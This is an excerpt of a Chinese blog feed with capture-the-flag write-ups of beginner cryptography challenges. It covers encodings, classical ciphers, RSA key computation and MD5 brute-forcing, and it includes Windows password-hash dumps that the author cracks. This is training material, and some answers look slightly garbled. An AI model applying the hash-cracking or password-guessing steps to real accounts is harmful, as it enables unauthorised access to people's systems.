        <content type="html"><![CDATA[<p>1 md 5</p><p>题如其名就是md5，这里推荐一个<a href="https://www.cmd5.com/">md5在线解码</a>网站，直接解码就行了，答案admain1</p><p>2  一眼就解密</p><p>考察的是base64编码，下面的字符串解密后便能获得flag：ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30= </p><p>3 url编码</p><p>这个一样是使用是<a href="https://www.bejson.com/enc/urlencode/">URL在线工具</a>解码就行,<code>flag&#123;and 1=1&#125;</code></p><blockquote><p>url编码是一种浏览器用来打包表单输入的格式。浏览器从表单中获取所有的name和其中的值 ，将它们以name/value参数编码作为URL的一部分或者分离地发给服务器。</p></blockquote><blockquote><p>URL编码遵循下列规则： 每对name/value由&amp;；符分开；每对来自表单的name/value由=符分开。 如果用户没有输入值给个name，那么这个name还是出现，只是无值。任何特殊的字符（如汉字）将以百分符%用十六进制编码，当然也包括象 =,&amp;；，和 % 这些特殊的字符。其实url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。比如“\”，它的ascii码是92，92的十六进制是5c，所以“\”的url编码就是%5c。 </p></blockquote><p>4 看我回旋踢</p><p>考的是凯撒密码，偏移量我们不知道，所以直接上枚举，得到<code>flag&#123;5cd1004d-86a5-46d8-b720-beb5ba0417e1&#125;</code></p><p>5 摩斯</p><p><code>.. .-.. --- ...- . -.-- --- ..-</code>确实是摩斯密码直接导入解码工具中，他们给我了<code>ᎊf9</code>这个仔细一看这个是用<code> </code>来分割的，解码后得到flag<code>ILOVEYOU</code></p><p>6 password</p><blockquote><p>姓名：张三<br>生日：19900315</p><p>key格式为key{xxxxxxxxxx}        其实很容易猜到key{zs19900315}</p></blockquote><p>这个提示给的不错了，这个是考察的简单的社会工程系，或者说是弱密码，过段时间关于弱密码做一个专题讲一讲。<br>7 变异凯撒</p><p>凯撒密码是一种通过移位进行加密的方式，也叫做凯撒移位，这个对比一下<code>afz_</code>与<code>flag</code>的ascall码。</p><table><thead><tr><th align="left"></th><th align="left"></th><th align="left">差值</th></tr></thead><tbody><tr><td align="left">a</td><td align="left">f</td><td align="left">5</td></tr><tr><td align="left">f</td><td align="left">l</td><td align="left">6</td></tr><tr><td align="left">Z</td><td align="left">a</td><td align="left">7</td></tr><tr><td align="left">_</td><td align="left">g</td><td align="left">8</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python">c <span class="token operator">=</span> <span class="token string">"afZ_r9VYfScOeO_UL^RWUc"</span>move <span class="token operator">=</span> <span class="token number">5</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> move<span class="token punctuation">)</span>    move <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag<code>flag&#123;Caesar_variation&#125;</code> </p><p>8 Quoted-printable </p><p>确实是一种我没见过的编码方式，在别人的博客上看到这些介绍：博客在此奉上 <code>http://blog.chacuo.net/494.html</code></p><blockquote><p>  Quoted-printable 可译为“可打印字符引用编码”、“使用可打印字符的编码”，我们收邮件，查看信件原始信息，经常会看到这种类型的编码！ </p><p>它是<strong>多用途互联网邮件扩展</strong>（MIME) 一种实现方式。其中MIME是一个互联网标准，它扩展了电子邮件标准，致力于使其能够支持非ASCII字符、二进制格式附件等多种格式的邮件消息。目前http协议中，很多采用MIME框架！quoted-printable 就是说用一些可打印常用字符，表示一个字节（8位）中所有非打印字符方法！ </p></blockquote><p>上网找到了一个<a href="http://web.chacuo.net/charsetquotedprintable/">解码工具</a>注意要使用<code>iso-8859-1</code>单字符集解码。</p><p>9 Rabbit</p><p>确实有个rabbit加密算法通过在线解码工具就能完成解码，得到flag。<img src="C:\Users\888888\Desktop\20200503121022650.png"></p><p>10 栅栏的影子</p><p>不难看出字符串仍具有类似flag的格式，由于’{‘前面并非四个字符，首字符’f’也没有被替换，所以应该不是凯撒加密，或单字母替换再根据标题提示信息，猜测是栅栏密码。</p><p>felhaagv{ewtehtehfilnakgw}</p><table><thead><tr><th align="left"></th><th align="left">1</th><th>2</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">f</td><td>e</td></tr><tr><td align="left">2</td><td align="left">l</td><td>h</td></tr><tr><td align="left">3</td><td align="left">a</td><td>a</td></tr><tr><td align="left">4</td><td align="left">g</td><td>v</td></tr></tbody></table><p>通过对比这是两组文字，可以解出<code>flag&#123;wethinkwehavetheflag&#125;</code><br>11 RSA</p><p>简单介绍一下RSA吧，这个也是现在密码学题目的一个重点方向</p><blockquote><p>RSA公钥密码体制<br>RSA公钥算法是由MIT的Rivest, Shamir和Adleman在I 978年提出来的。RSA方案是被最广泛接受并实现的通用公开密钥密码算法，目前已成为公钥密码的国际标准。该算法的数学基础是初等数论中的欧拉定理，其安全性建立在大整数因子分解的困难性之上。</p></blockquote><blockquote><p>RSA的算法描述<br>密钥的生成</p><ol><li>选择两个大素数 p，q，（p，q为互异素数，需要保密），</li><li>计算n = p×q， (n) = (p－1)×(q－1)</li><li>选择整数 e 使 ((n)，e) =1,   1&lt;e&lt; (n) </li><li>计算d，使d = e－1mod (n),得到：公钥 为{e,n}； 私钥为{d}</li></ol></blockquote><p>题目给了这个tip 注意：得到的 flag 请 将 noxCTF 替换为 flag ，格式为 flag{} 提交。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2p<span class="token operator">=</span><span class="token number">473398607161</span>q<span class="token operator">=</span><span class="token number">4511491</span>e<span class="token operator">=</span><span class="token number">17</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>d<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写一个脚本就行，值得注意的是noxCTF就没有出现。</p><p>12 丢失的md5</p><blockquote><p>我们得到了一串神秘字符串：TASC?O3RJMV?WDJKX?ZM,问号部分是未知大写字母，为了确定这个神秘字符串，我们通过了其他途径获得了这个字串的32位MD5码。但是我们获得它的32位MD5码也是残缺不全，E903???4DAB???08???51?80??8A?,请猜出神秘字符串的原本模样，并且提交这个字串的32位MD5码作为答案。</p></blockquote><p>解题思路：</p><p>通过脚本补全MD5的值，解码得到flag{}</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            m<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>            s <span class="token operator">=</span> <span class="token string">'TASC'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'O3RJMV'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'WDJKX'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'ZM'</span>            <span class="token comment"># TASC J O3RJMV K WDJKX L ZM</span>            m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            des<span class="token operator">=</span>m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'e9032'</span> <span class="token keyword">in</span> des <span class="token keyword">and</span> <span class="token string">'da'</span> <span class="token keyword">in</span> des <span class="token keyword">and</span> <span class="token string">'911513'</span> <span class="token keyword">in</span> des<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>               <span class="token comment"># print(m)   </span>                <span class="token keyword">print</span><span class="token punctuation">(</span>des<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>13 Alice与Bob(大模数分解)</p><blockquote><p> 密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数:98554799767,请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。 注意：得到的 flag 请包上 flag{} 提交 </p></blockquote><p>大素数分解，这一种问题我还是习惯通过在线的工具进行分解，虽然接下来的比赛禁止访问外网……所以找了个这东西。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2    <span class="token comment">#因数分解,返回值分别为n的因数</span><span class="token keyword">def</span> <span class="token function">Factorization</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token comment">#gmpy2.iroot(x,n) #x开n次根</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        y2 <span class="token operator">=</span> x <span class="token operator">*</span> x <span class="token operator">-</span> n        y <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>y2<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        p<span class="token punctuation">,</span> q <span class="token operator">=</span> x <span class="token operator">+</span> y<span class="token punctuation">,</span> x <span class="token operator">-</span> y        <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token operator">==</span> n<span class="token punctuation">:</span>            <span class="token keyword">if</span> gmpy2<span class="token punctuation">.</span>is_prime<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token keyword">and</span> gmpy2<span class="token punctuation">.</span>is_prime<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#素性检测</span>                <span class="token keyword">return</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span>        x <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然我还是喜欢用<a href="http://www.factordb.com/">在线的分解工具</a>解题…….</p><p>14 大帝的密码武器</p><p>罗马，大帝，密码学………就差报身份证了，<del>凯撒加密</del>，对<strong>FRPHEVGL</strong>进行枚举，得到</p><blockquote><p>frphevgl,gsqifwhm,htrjgxin,iuskhyjo,jvtlizkp,kwumjalq,lxvnkbmr,mywolcns,nzxpmdot,oayqnepu,pbzrofqv,qcaspgrw,rdbtqhsx,security,tfdvsjuz,ugewtkva,vhfxulwb,wigyvmxc,xjhzwnyd,ykiaxoze,zljbypaf,amkczqbg,bnldarch,comebsdi,dpnfctej,eqogdufk</p></blockquote><p>英语有问题的硬生生不知道哪个是正确的偏移量，不过直接对秘文进行解密，也就多试几次就行。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;PbzrPuvan&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>15 Windows系统密码(md5)</p><blockquote><p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56:::</p></blockquote><p>对这些全部进行一遍md5解密， 对a7fcb22a88038f35a8f39d503e7f0062解得一个正常的**<code>good-luck </code><strong>得到</strong>flag{ good-luck}**</p><p>16 信息化时代的步伐</p><blockquote><p>606046152623600817831216121621196386<br>也许中国可以早早进入信息化时代，但是被清政府拒绝了。附件中是数十年后一位伟人说的话的密文。请翻译出明文(答案为一串中文！)</p></blockquote><p><strong>yzdawx0tzyyevldy1ooxx7m</strong>这东西是啥？在了解之后，这个是 <strong><code>中文电码</code><strong>通过解码工具解码得到，</strong><code>计算机要从娃娃抓起</code> <strong>。得到</strong><del>flag{计算机要从娃娃抓起}</del></strong></p><p>17 传统知识+古典密码</p><blockquote><p> 小明某一天收到一封密信，信中写了几个不同的年份：辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。信的背面还写有“+甲子”，请解出这段密文。 </p></blockquote><p> 在古代采用干支纪年法，即使用10天干12地支的组合记录年号，60年完成一个循环周期(60是10和12的最小公倍数)，称一个”甲子”。</p><blockquote><p>辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳分别对应：28，30，23，08，17，10，16，30再加上一甲子(60)，得到88，90，83，68，77，70，76，90对应Ascll文本为：XZSDMFLZ</p></blockquote><p>栅栏密码+凯撒密码解出正确答案，XZSDMFLZ只有8位字符，栏数只能是2或者4。<strong>2栏解密：XMZFSLDZ</strong>，<strong>4栏解密：XSMLZDFZ</strong>再进行凯撒枚举。</p><p>对第一栏<strong>XMZFSLDZ</strong>进行凯撒枚举，得到一堆其中又一个<del>双鱼**(shuangyu)**</del>得到**<code>flag&#123;shuangyu&#125;</code>**</p><p>18 传感器(曼彻斯特编码)</p><blockquote><p>5555555595555A65556AA696AA6666666955这是某压力传感器无线数据包解调后但未解码的报文(hex)<br>已知其ID为0xFED31F，请继续将报文完整解码，提交hex。提示1：<strong>曼联</strong></p></blockquote><p>曼联– 曼彻斯特联足球俱乐部 ,重点在于<strong>曼彻斯特</strong>这是一种编码方式。</p><blockquote><p> <strong>曼彻斯特编码</strong>（Manchester Encoding），也叫做相位编码(PE)是一个同步时钟编码技术，被物理层用来编码一个同步位流的时钟和数据；常用于局域网传输。在曼彻斯特编码中，每一位的中间有一跳变，位中间的跳变既作时钟信号，又作数据信号,就是说主要用在数据同步传输的一种编码方式。 </p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">GE</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#GE标准</span>    c2bin <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'5'</span><span class="token punctuation">:</span><span class="token string">'00'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">:</span><span class="token string">'10'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">:</span><span class="token string">'01'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">:</span><span class="token string">'11'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">:</span><span class="token string">'11'</span><span class="token punctuation">&#125;</span>    s_bin <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        s_bin <span class="token operator">+=</span> c2bin<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token comment">#print(s_bin)</span>    s_bin_re <span class="token operator">=</span> <span class="token string">''</span>    <span class="token comment">#下面是做了数据报文大小端处理，即每个字节内部倒序</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s_bin<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        s_bin_re <span class="token operator">+=</span> s_bin<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s_bin_re<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">IEE</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#IEE标准</span>    c2bin <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'5'</span><span class="token punctuation">:</span><span class="token string">'11'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">:</span><span class="token string">'01'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">:</span><span class="token string">'10'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">:</span><span class="token string">'00'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">:</span><span class="token string">'00'</span><span class="token punctuation">&#125;</span>    s_bin <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        s_bin <span class="token operator">+=</span> c2bin<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token comment">#print(s_bin)</span>    s_bin_re <span class="token operator">=</span> <span class="token string">''</span>    <span class="token comment">#下面是做了数据报文大小端处理，即每个字节内部倒序</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s_bin<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        s_bin_re <span class="token operator">+=</span> s_bin<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s_bin_re<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token string">"5555555595555A65556AA696AA6666666955"</span><span class="token keyword">print</span><span class="token punctuation">(</span>GE<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>IEE<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解码后得到 <code>0X12CE09BAFAA06</code>与<code>0XFFFFFED31F645055F9</code>两个答案，其中的<strong>0XFFFFFED31F645055F9</strong>的形式是对应题目的<strong>ID</strong>得到<code>flag</code>。</p><p>19 凯撒？替换？呵呵</p><p>……这个真的不是凯撒加密，这个是替换。还是<a href="https://quipqiup.com/">https://quipqiup.com/</a> 进行暴力破解。**<code>MTHJ=flag</code>**爆破得到</p><pre class="line-numbers language-none"><code class="language-none">flag substitution cipher decryption is always easy just like a piece of cake<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到<strong>flag{substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake}</strong></p><p>20 萌萌哒八戒(猪圈密码)</p><p>看到图片底下这些符号，很明显是猪圈密码，解密可得whenthepigwanttoeat。</p><blockquote><p> flag{whenthepigwanttoeat} </p></blockquote><p>21 old-fashion(字母替换)</p><blockquote><p>Os drnuzearyuwn, y jtkjzoztzoes douwlr oj y ilzwex eq lsdexosa kn pwodw tsozj eq ufyoszlbz yrl rlufydlx pozw douwlrzlbz, ydderxosa ze y rlatfyr jnjzli; mjy gfbmw vla xy wbfnsy symmyew (mjy vrwm qrvvrf), hlbew rd symmyew, mebhsymw rd symmyew, vbomgeyw rd mjy lxrzy, lfk wr dremj. Mjy eyqybzye kyqbhjyew mjy myom xa hyedrevbfn lf bfzyewy wgxwmbmgmbrf. Wr mjy dsln bw f1_2jyf-k3_jg1-vb-vl_l</p></blockquote><p>还是暴力破解，dsln bw应该就是flag is的移位，暴力破解得到结果：</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;n1_2hen-d3_hu1-mi-ma_a&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>22 获得权限的第一部</p><pre class="line-numbers language-none"><code class="language-none">Administrator:500:806EDC27AA52E314AAD3B435B51404EE:F4AD50F57683D4260DFD48AA351A17A8:::<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对md5值进行解码，得到<strong>flag{3617656}</strong></p><p>23 世上无难事(字母替换)</p><p>这个依旧是字母替换。<strong>PIO=key KQ=IS</strong></p><blockquote><p> COULD JOIN US TODAY AND WE WANT TO THANK WAKEFIELD FOR BEING SUCH AN OUTSTANDING HOST GIVE YOURSELVES A BIG ROUND OF APPLAUSE AND THE KEY IS 640E11012805F211B0AB24FF02A1ED09 </p></blockquote><p><strong>flag{640e11012805f211b0ab24ff02a1ed09}</strong></p><p>23 异性相吸</p><blockquote><p>key：asadsasdasdasdasdasdasdasdasdasdqwesqf</p><p>密文：ἇ̀Ј唒ဃ塔屋䩘卖剄䐃堂ن䝔嘅均ቄ䩝ᬔ</p></blockquote><p>这里密文是乱码，我们转换成二进制查看。</p><blockquote><p>key: 01100001 01110011 01100001 01100100 01110011 01100001 01110011 01100100 01100001 01110011 01100100 01100001 01110011 01100100 01100001 01110011 01100100 01100001 01110011 01100100 01100001 01110011 01100100 01100001 01110011 01100100 01100001 01110011 01100100 01100001 01110011 01100100 01110001 01110111 01100101 01110011 01110001 01100110</p></blockquote><blockquote><p>密文:00000111 00011111 00000000 00000011 00001000 00000100 00010010 01010101 00000011 00010000 01010100 01011000 01001011 01011100 01011000 01001010 01010110 01010011 01000100 01010010 00000011 01000100 00000010 01011000 01000110 00000110 01010100 01000111 00000101 01010110 01000111 01010111 01000100 00010010 01011101 01001010 00010100 00011011</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token string">'01100001 01110011 01100001 01100100 01110011 01100001 01110011 01100100 01100001 01110011 01100100 01100001 01110011 01100100 01100001 01110011 01100100 01100001 01110011 01100100 01100001 01110011 01100100 01100001 01110011 01100100 01100001 01110011 01100100 01100001 01110011 01100100 01110001 01110111 01100101 01110011 01110001 01100110'</span>msg <span class="token operator">=</span> <span class="token string">'00000111 00011111 00000000 00000011 00001000 00000100 00010010 01010101 00000011 00010000 01010100 01011000 01001011 01011100 01011000 01001010 01010110 01010011 01000100 01010010 00000011 01000100 00000010 01011000 01000110 00000110 01010100 01000111 00000101 01010110 01000111 01010111 01000100 00010010 01011101 01001010 00010100 00011011'</span>s <span class="token operator">=</span> <span class="token string">''</span>key <span class="token operator">=</span> key<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>msg <span class="token operator">=</span> msg<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>        s <span class="token operator">+=</span> <span class="token string">'0'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        s <span class="token operator">+=</span> <span class="token string">'1'</span>L <span class="token operator">=</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token comment">#分离每一个字节</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> L<span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#转化为Ascll字符</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到<code>flag&#123;ea1bc0988992276b7f95b54a7435e89e&#125; </code></p><p>24 Unencode</p><p>由标题很容易想到这是<strong>UUencode</strong>直接**<del>UUencode</del>**解码得到: <strong><code>flag&#123;dsdasdsa99877LLLKK&#125;</code></strong></p><p>25 [AFCTF2018]Morse</p><p>直接就莫斯电码了61666374667B317327745F73305F333435797D，<code>%7d</code>这个就是}，由此对莫斯电码转为16进制，得到<code>afctf&#123;1s&#39;t_s0_345y&#125;</code></p><p>26 佛说：只能四天</p>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUGKU靶场解题记录之Cypto</title>
      <link href="/2021/10/03/BUGKU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8BCrypto/"/>
      <url>/2021/10/03/BUGKU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8BCrypto/</url>
      
        <content type="html"><![CDATA[<hr><center>BUGKU靶场解题记录之Cypto</center>#### 1 /.-<blockquote><p>..-./.-../.-/–./—-.–/-../…–/..-./-.-./-…/..-./.—-/–…/..-./—-./…–/—-./—-./…../—–/….-/—–.-</p></blockquote><p>一个很简单的莫斯密码题，使用线上的<a href="https://tool.bugku.com/mosi/">解题工具</a>即可完成。注意*%u7b<em>和</em>%u7d<em>分别是</em><em>{</em>* 和 **}**。</p><h4 id="2-聪明的小羊"><a href="#2-聪明的小羊" class="headerlink" title="2  聪明的小羊"></a>2  聪明的小羊</h4><p>题干是一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}，提示的很清楚栅栏密码，直接解码就行。</p><h4 id="3-okk"><a href="#3-okk" class="headerlink" title="3 okk"></a>3 okk</h4><p>说真的我并不知道这道题的考点在哪里。下载是一个txt文件，打开一大串由okk组成的字符，使用<a href="https://ctf.bugku.com/tool/brainfuck">在线工具解码</a>就行。</p><blockquote><p>okk密码实际上是一种编程语言，由okk. okk? okk!组成。</p></blockquote><h4 id="4-lt-gt"><a href="#4-lt-gt" class="headerlink" title="4 [+-&lt;&gt;]"></a>4 [+-&lt;&gt;]</h4><p>说真的这道题跟上一道题是接近一毛一样，这是使用的是一款可读性几乎为0的语言:Brainfuck!<br>解码还是用上一道题的链接就行，bugku本站将两种编码的在线解码放在了同一个工具里。</p><h4 id="5-你以为是md5吗"><a href="#5-你以为是md5吗" class="headerlink" title="5 你以为是md5吗"></a>5 